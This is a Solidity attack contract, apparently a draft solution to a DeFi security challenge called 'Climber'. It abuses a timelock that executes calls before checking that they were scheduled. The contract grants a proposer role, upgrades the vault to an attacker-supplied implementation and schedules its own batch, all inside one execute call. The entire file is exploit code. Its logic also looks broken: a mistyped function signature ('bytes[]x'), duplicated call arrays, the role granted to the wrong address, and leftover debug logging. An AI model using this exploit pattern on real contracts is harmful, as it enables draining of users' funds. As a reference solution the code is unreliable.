// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract AttackClimberTimelock {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    IClimberTimelock public climberTimelock;
    address public immutable climberVault;

    address[] private targets;
    uint256[] private values = new uint256[](3);
    bytes[] private dataElements;
    bytes[] private dataElementss;

    constructor(IClimberTimelock _timelock, address _climberVault) {
        climberTimelock = _timelock;
        climberVault = _climberVault;
    }

    function attack(address _newVault) external {
        // Grant proposer role to this contract so we can schedule actions
        targets.push(address(climberTimelock));
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(climberTimelock)
            )
        );
        dataElementss.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(climberTimelock)
            )
        );

        targets.push(climberVault);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", _newVault)
        );
        dataElementss.push(
            abi.encodeWithSignature("upgradeTo(address)", _newVault)
        );

        // targets.push(address(this));
        // dataElements.push(abi.encodeWithSignature("schedule()"));

        targets.push(address(climberTimelock));
        console.log(dataElements.length);
        dataElements.push(
            abi.encodeWithSignature(
                "schedule(address[],uint256[],bytes[]x,bytes32)",
                targets,
                values,
                dataElements,
                "SALT"
            )
        );
        console.log(dataElements.length);

        dataElementss.push(
            abi.encodeWithSignature(
                "schedule(address[],uint256[],bytes[],bytes32)",
                targets,
                values,
                dataElements,
                "SALT"
            )
        );

        console.log(dataElementss.length);

        climberTimelock.execute(targets, values, dataElementss, "SALT");
    }

    function schedule() public {
        climberTimelock.schedule(targets, values, dataElementss, "SALT");
    }
}
